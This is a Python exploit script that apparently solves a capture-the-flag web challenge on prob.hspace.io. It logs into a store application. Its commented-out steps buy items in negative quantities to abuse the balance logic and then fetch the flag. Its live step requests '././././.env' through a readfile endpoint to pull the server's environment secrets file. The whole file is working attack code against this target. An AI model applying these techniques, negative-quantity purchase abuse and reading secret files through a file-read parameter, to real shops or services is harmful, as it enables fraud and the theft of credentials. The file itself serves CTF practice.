import requests
from time import sleep

path = 'http://prob.hspace.io:23802/'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
}

def register(id, pw) -> str:
    res = requests.post(
        path + 'register',
        headers=headers,
        data = {
            'username': id,
            'password': pw,
        }
    )

    return res.text


def login(id, pw, session) -> str:
    res = session.post(
        path + 'login',
        headers=headers,
        data = {
            'username': id,
            'password': pw,
        }
    )

    try:
        return res.json()
    except:
        return res.text


def store_view(session) -> dict:
    res = session.get(
        path + 'store',
        headers=headers,
    )

    try:
        return res.json()
    except:
        return res.text
    

def buy_item(session, item_name, item_qty) -> str:
    res = session.post(
        path + 'store/buy',
        headers=headers,
        data = {
            'item': item_name,
            'quantity': item_qty
        }
    )

    return res.text


def sell_item(session, item_name, item_qty) -> str:
    res = session.post(
        path + 'store/sell',
        headers=headers,
        data = {
            'item': item_name,
            'quantity': item_qty,
        }
    )

    return res.text


def view_flag(session) -> str:
    res = session.get(
        path + 'flag',
        headers=headers,
    )

    return res.text


def readfile(session, file) -> str:
    res = session.get(
        path + 'readfile',
        headers=headers,
        params = {
            'file' : file,
        }
    )

    return res.text


def main() -> None:
    id, pw = 'kiroo', '1234'
    #print(register(id, pw))
    session = requests.Session()
    #sleep(10)
    print(info := login(id, pw, session))
    #sleep(10)
    #print(store_view(session))
    #sleep(10)
    #print(buy_item(session, 'Fig', "-100"))
    #sleep(10)
    #print(buy_item(session, 'Flag', '-20'))
    #sleep(10)
   # print(store_view(session))
    #sleep(10)
    #print(view_flag(session))
    print(readfile(session, '././././.env'))
    


if __name__ == "__main__":
    main()